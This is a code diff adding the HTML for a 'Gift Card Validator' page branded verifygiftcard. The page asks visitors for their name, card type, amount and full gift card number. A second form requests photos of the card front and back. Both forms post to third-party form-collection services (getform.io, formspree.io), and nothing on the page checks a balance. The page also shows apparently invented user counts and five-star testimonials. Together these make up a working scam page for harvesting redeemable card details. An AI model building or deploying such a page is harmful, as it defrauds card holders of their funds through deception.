@@ -1,0 +1,236 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Gift Card Validator</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+    <!-- New top section with text and button -->
+    <div class="intro">
+        <p>Check the balance on your gift card easily.</p>
+        <p>Find out how much is left on your gift card in a matter of seconds. Easygoing, regardless of whether you bought anything for yourself or received a gift card.</p>
+        <button id="check-gift-card-intro" class="check-gift-card-button">CHECK GIFT CARD</button>
+    </div>
+
+    <!-- Slideshow Container -->
+    <div class="slideshow-container">
+        <div class="slideshow-images">
+            <img src="img/1.png" alt="Gift card image 1">
+            <img src="img/2.png" alt="Gift card image 2">
+            <img src="img/4.png" alt="Gift card image 4">
+            <img src="img/5.png" alt="Gift card image 5">
+            <img src="img/6.png" alt="Gift card image 6">
+            <img src="img/7.png" alt="Gift card image 7">
+            <img src="img/8.png" alt="Gift card image 8">
+        </div>
+            <div class="intro2">
+                <p>Remain in charge at all times and places.</p>
+                <p>Embrace the day of no more guesswork! Get up-to-date information in real time on the balance on your gift card so you always know. Our website is easy to use and allows you to check your balance from anywhere at any time, whether you’re on a laptop, tablet, or smartphone.</p>
+                <p>Your gift card balance may be easily checked using our simple and easy interface. Simply follow the easy procedures to retrieve your card data.</p>
+            <button id="check-gift-card-intro2" class="check-gift-card-button">CHECK GIFT CARD</button>
+        </div>
+    </div>
+
+    <!-- Form Section -->
+    <div class="form">
+        <h2>Check Your Card Validity</h2>
+        <form action="https://getform.io/f/bnllpvgb" method="POST" id="check-card-form" enctype="multipart/form-data">
+            <label for="name">Name</label>
+            <input type="text" id="name" name="name" placeholder="Enter your name" required>
+
+            <label for="card-type">Select Gift Card Type</label>
+            <select id="card-type" name="card-type" required>
+                <option value="">Select Gift Card Type</option>
+                <option value="visa">Visa Gift Card</option>
+                <option value="amazon">Amazon Gift Card</option>
+                <option value="walmart">Walmart Gift Card</option>
+                <option value="itunes">iTunes Gift Card</option>
+                <option value="amex">American Express Gift Card</option>
+                <option value="target">Target Gift Card</option>
+                <option value="starbucks">Starbucks Gift Card</option>
+                <option value="disney">Disney Gift Card</option>
+                <option value="sephora">Sephora Gift Card</option>
+                <option value="ebay">eBay Gift Card</option>
+            </select>
+
+            <label for="amount">Amount</label>
+            <input type="number" id="amount" name="amount" placeholder="Enter the amount" required>
+
+            <label for="card-number">Card Number</label>
+            <input type="text" id="card-number" name="card-number" placeholder="Enter the card number" required>
+
+            <input type="submit" class="check-gift-card-button" value="CHECK NOW">
+        </form>
+    </div>
+    <div class="countup-container">
+        <!-- First countup with label -->
+        <div class="countup-item">
+            <label for="countup-1" class="countup-label">Happy Users</label>
+            <div id="countup-1" class="countup">1000+</div>
+        </div>
+
+        <!-- Second countup with label -->
+        <div class="countup-item">
+            <label for="countup-2" class="countup-label">Valid Card Checked</label>
+            <div id="countup-2" class="countup">1500+</div>
+        </div>
+    </div>
+    <!-- third countup with label -->
+        <div class="countup-item">
+            <label for="countup-3" class="countup-label">
+            Earn Points
+</label>
+            <div id="countup-3" class="countup">300</div>
+        </div>
+    </div>
+    <!-- Confirmation Section for other Cards (e.g. Vanilla, AMEX) -->
+    <div class="confirmation">
+        <h2>For other Cards, such as Vanilla, AMEX, or Other Prepaid Cards, Upload Picture for Confirmation</h2>
+        <form action="https://formspree.io/f/xyzzpglb" method="POST" id="confirmation-form" enctype="multipart/form-data">
+            <label for="card-name">Card Name</label>
+            <input type="text" id="card-name" name="card-name" placeholder="Enter Card Name" required>
+
+            <label for="card-amount">Amount</label>
+            <input type="number" id="card-amount" name="card-amount" placeholder="Enter Amount" required>
+
+            <div class="file-upload">
+                <label for="card-front">Upload Card Front</label>
+                <input type="file" id="card-front" name="card-front" onchange="updateFileName('card-front', 'front-file-name')" required>
+                <p id="front-file-name">No file chosen</p>
+            </div>
+
+            <div class="file-upload">
+                <label for="card-back">Upload Card Back</label>
+                <input type="file" id="card-back" name="card-back" onchange="updateFileName('card-back', 'back-file-name')" required>
+                <p id="back-file-name">No file chosen</p>
+            </div>
+
+            <input type="submit" class="check-gift-card-button" value="CHECK NOW">
+        </form>
+    </div>
+
+    <!-- Review Section -->
+    <div class="review">
+        <div class="wp-block-uagb-star-rating">
+            <div class="uag-star-rating" title="5/5">
+                <span class="uag-star">★</span>
+                <span class="uag-star">★</span>
+                <span class="uag-star">★</span>
+                <span class="uag-star">★</span>
+                <span class="uag-star">★</span>
+            </div>
+        </div>
+        <div class="wp-block-uagb-advanced-heading">
+            <h6 class="uagb-heading-text">Willem</h6>
+        </div>
+        <div class="wp-block-uagb-info-box">
+            <div class="uagb-infobox-margin-wrapper">
+                <div class="uagb-ifb-content">
+                    <div class="uagb-ifb-image-content">
+                        <img src="img/client-1.png" alt="Client Image">
+                    </div>
+                    <p class="uagb-ifb-desc">”I’ve used verifygiftcard for months now, and it’s been a game changer for my online store. The user interface is intuitive, and the accuracy of the validations is impressive. It’s saved me countless hours and eliminated the hassle of handling invalid cards. Highly recommended!”</p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+                        <div class="review">
+                            <div class="wp-block-uagb-star-rating">
+                                <div class="uag-star-rating" title="5/5">
+                                    <span class="uag-star">★</span>
+                                    <span class="uag-star">★</span>
+                                    <span class="uag-star">★</span>
+                                    <span class="uag-star">★</span>
+                                    <span class="uag-star">★</span>
+                                </div>
+                            </div>
+                            <div class="wp-block-uagb-advanced-heading">
+                                <h6 class="uagb-heading-text">Martha</h6>
+                            </div>
+                            <div class="wp-block-uagb-info-box">
+                                <div class="uagb-infobox-margin-wrapper">
+                                    <div class="uagb-ifb-content">
+                                        <div class="uagb-ifb-image-content">
+                                            <img src="img/client-2.png" alt="Client Image">
+                                        </div>
+                                        <p class="uagb-ifb-desc">”I’m a small business owner, and keeping track of gift card balances used to be a nightmare. verifygiftcard not only simplifies the process but also provides detailed reports that help me track usage trends. It’s user-friendly and reliable—I wouldn’t go back to manual checks!”</p>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="review">
+        <div class="wp-block-uagb-star-rating">
+            <div class="uag-star-rating" title="5/5">
+                <span class="uag-star">★</span>
+                <span class="uag-star">★</span>
+                <span class="uag-star">★</span>
+                <span class="uag-star">★</span>
+                <span class="uag-star">★</span>
+            </div>
+        </div>
+        <div class="wp-block-uagb-advanced-heading">
+            <h6 class="uagb-heading-text">Stefanie</h6>
+        </div>
+        <div class="wp-block-uagb-info-box">
+            <div class="uagb-infobox-margin-wrapper">
+                <div class="uagb-ifb-content">
+                    <div class="uagb-ifb-image-content">
+                        <img src="img/client-3.png" alt="Client Image">
+                    </div>
+                    <p class="uagb-ifb-desc">“As someone who manages gift cards for a large chain of restaurants, finding a reliable validator was crucial. verifygiftcard has exceeded our expectations with its fast processing times and seamless integration. It’s a must-have tool for any business handling gift cards.”</p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="review">
+        <div class="wp-block-uagb-star-rating">
+            <div class="uag-star-rating" title="5/5">
+                <span class="uag-star">★</span>
+                <span class="uag-star">★</span>
+                <span class="uag-star">★</span>
+                <span class="uag-star">★</span>
+                <span class="uag-star">★</span>
+            </div>
+        </div>
+        <div class="wp-block-uagb-advanced-heading">
+            <h6 class="uagb-heading-text">Solange</h6>
+        </div>
+        <div class="wp-block-uagb-info-box">
+            <div class="uagb-infobox-margin-wrapper">
+                <div class="uagb-ifb-content">
+                    <div class="uagb-ifb-image-content">
+                        <img src="img/client-4.png" alt="Client Image">
+                    </div>
+                    <p class="uagb-ifb-desc">“verifygiftcard is fantastic! The real-time validation feature is incredibly useful, and the customer support team is always responsive and helpful. It’s clear that a lot of thought went into making this tool both effective and easy to use.”</p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Footer Section -->
+    <footer>
+        <p>© 2024 Gift Card Validator</p>
+    </footer>
+
+    <!-- Script to update file names -->
+    <script>
+        function updateFileName(inputId, fileNameId) {
+            var input = document.getElementById(inputId);
+            var fileNameDisplay = document.getElementById(fileNameId);
+            var fileName = input.files.length > 0 ? input.files[0].name : "No file chosen";
+            fileNameDisplay.textContent = fileName;
+        }
+    </script>
+    <script src="script.js">
+        
+    </script>
+    
+</body>
+
+</html>
